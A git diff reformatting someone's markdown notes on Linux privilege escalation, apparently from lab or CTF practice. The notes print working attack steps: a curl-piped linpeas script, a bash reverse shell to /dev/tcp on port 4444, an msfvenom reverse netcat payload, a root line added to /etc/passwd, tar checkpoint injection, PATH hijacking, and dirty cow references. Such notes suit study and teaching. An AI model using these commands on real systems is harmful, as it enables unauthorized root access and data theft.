@@ -1,124 +1,136 @@
 # privesc
 
-INTRO
-horizontal privesc
-vertical privesc
+- INTRO
+
+- horizontal privesc
+
+- vertical privesc
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation  (carlosmpolopm)
 
-Linpeas
-# From github
+## Linpeas
 
+### From github
+
+```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
 
-# Output to file
+### Output to file
 
+```bash
 ./linpeas.sh -a /tmp/linpeas.txt #Victim
-less -r /linpeas.txt #Read with colors
 
-linenum
+less -r /linpeas.txt #Read with colors
+```
+
+## linenum
+
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 
-two ways of uploading:
+## two ways of uploading:
+
 1- python server then wget
-```basic
+
+```
 python3 -m http.server 8000
 
 wget <ip>:<port>/<file>
 
 chmod +x <file.sh>
 ```
+
 2- copy and paste linenum using Vi or nano , save and add permission
 
-###		INDEX
-1.  Basic
-2.  Path Variables
-3.  Raptor / mysql
-4.  weak file permissions
-5.  SUDO 
-6.  Abusing shell features
-7.  Pass & Keys
-8.  Mounting Shares
-9.  Kernell
+# INDEX
 
+1- [Basic](#1)
 
+2- [Path Variables](#2)
 
+3- [Raptor / mysql](#3)
 
+4- [weak file permissions](#4)
+
+5- [SUDO ](#5)
+
+6- [Abusing shell features](#6)
+
+7- [Pass & Keys](#7)
+
+8- [Mounting Shares](#8)
+
+9- [Kernell](#9)
+
+[go back to top](#index)
+
+## 1
 
 ### Basic manual enumeration
 
 hostname:
-id
+
+`id`
 
 users:
-cat /etc/passwd;  ls -lah /etc/passwd
+
+`cat /etc/passwd;  ls -lah /etc/passwd`
 
 shells:
-cat /etc/shells; ls -lah /etc/shells
+
+`cat /etc/shells; ls -lah /etc/shells`
 
 crontabs:
-cat /etc/crontab; ls -lah /etc/crontab
+
+`cat /etc/crontab; ls -lah /etc/crontab`
 
 shadow
-cat /etc/shadow; ls -lah /etc/shadow
 
-
-
+`cat /etc/shadow; ls -lah /etc/shadow`
 
 What can user run as root?
 
-sudo -l
-
-
-
-
-
+`sudo -l`
 
 Finding and Exploiting SUID Files
 
-find / -perm -u=s -type f 2>/dev/null
+`find / -perm -u=s -type f 2>/dev/null`
 
 
-find / -type f -u plotted_root 2>/dev/null
+`find / -type f -u plotted_root 2>/dev/null`
 
+---
 
+### Exploiting a writable /etc/passwd
 
-Exploiting a writable /etc/passwd
-
- ```
+```js
 	test:x:0:0:root:/root:/bin/bash
 ```
 
 as divided by colon 
 
-    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
-    
-	Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
-    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
-    
-	Group ID (GID): The primary group ID (stored in /etc/group file)
-    
-	User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
-    
-	Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
-    
-	Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
+**Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
+
+**Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
+User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
+
+**Group ID (GID)**: The primary group ID (stored in /etc/group file)
+
+**User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
+
+**Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
+
+**Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
 
 
 ```
 openssl passwd -1 -salt [salt] [password]
 ```
 
-
-
-
-
-
 ### Escaping Vi
 
-
-
 sudo -l 
+
 ```
 user8@polobox:/home/user3$ sudo -l
 Matching Defaults entries for user8 on polobox:
@@ -137,10 +149,10 @@ then type to open shell as root:
 
 
 ### Cronjob
+
 ```
 cat /etc/cronjob
 ```
-
 
 Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
 
@@ -173,75 +185,72 @@ replace content of file with reverse shell:
 msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 ```
 
-cron jobs file permission
+### cron jobs file permission
 
 
 cat /etc/crontab
 
-locate <file>
+`locate <file>`
 
-ls -l <file>
+`ls -l <file>`
 
 
 make file, 
 
+```
 #!/bin/bash
 bash -i >& /dev/tcp/10.6.65.43/4444 0>&1
+```
 
 start listner,
-nc -lvnp 4444
 
+`nc -lvnp 4444`
 
+# #2
 
+### $PATH variable
 
-
-
-
-
-
-
-
-### 2. $PATH   variable
-
+[go back to top](#index)
 
 echo $PATH
 
 create file in tmp
 
+
 echo "[whatever command we want to run]" > [name of the executable we're imitating] 
 
-```echo "/bin/bash" > ls```
+```
+echo "/bin/bash" > ls
+```
 
 
 make it executable
 
-```chmod +X ls```
+```
+chmod +X ls
+```
 
 or 
 
-```chmod 777 ls```
+```
+chmod 777 ls
+```
 
 
 change the path variable
 
-```export PATH=/tmp/:$PATH```
+```
+export PATH=/tmp/:$PATH
+```
 
 
-go back to diretory of binary and run again
+go back to directory of binary and run again
 
+# 3
 
+### raptor practice
 
-
-
-
-
-
-
-
-
-
-### 3. raptor practise
-
+[go back to top](#index)
 
 ```
 id
@@ -289,11 +298,11 @@ exit
 
 
 
+# 4
 
+### weak file permission
 
-### 4.  weak file permission
-
-
+[go back to top](#index)
 
 readable /etc/shadow file
 ```
@@ -340,11 +349,11 @@ Alternatively, copy the root user's row and append it to the bottom of the file,
 
 
 
+# 5
 
+### SUDO
 
-### 5.  SUDO
-
-
+[go back to top](#index)
 
 sudo shell escape sequence
 ```
@@ -444,14 +453,6 @@ touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 nc -nvlp 4444
-
-
-
-
-
-
-
-
 
 ### SUID / SGID
 
@@ -561,8 +562,11 @@ user@debian:~/tools/privesc-scripts$ PATH=.:$PATH /usr/local/bin/suid-env
 root@debian:~/tools/privesc-scripts# 
 ```
 
+# 6
 
-### 6. Abusing shell features #1
+### Abusing shell features #1
+
+[go back top](#index)
 
 The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
 
@@ -658,9 +662,11 @@ rootbash-4.1# id
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 ```
 
-### 7 Passwords & Keys
+# 7
 
+### Passwords & Keys
 
+[go back top](#index)
 
 History file
 
@@ -730,10 +736,11 @@ Use the key to login to the Debian VM as the root account (change the IP accordi
 
 
 
+# 8
 
+## NSF  (mounting shares)
 
-8.  NSF  (mounting shares)
-
+[go back top](#index)
 
 Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
@@ -767,9 +774,11 @@ Back on the Debian VM, as the low privileged user account, execute the file to g
 
 
 
+# 9
 
+## Kernell 
 
-Kernell 
+[go back to top](#index)
 
 
 dirty cow     Linux Kernel <= 3.19.0-73.8
@@ -784,7 +793,7 @@ https://www.exploit-db.com/exploits/40839/
 other versions,
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 
-```
+```js
 user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
 
   #############################
@@ -874,7 +883,7 @@ searchsploit Linux Kernell <version>
 ps -aux | grep root
 
 
- 
+ [go back to top](#index)
  
  
 
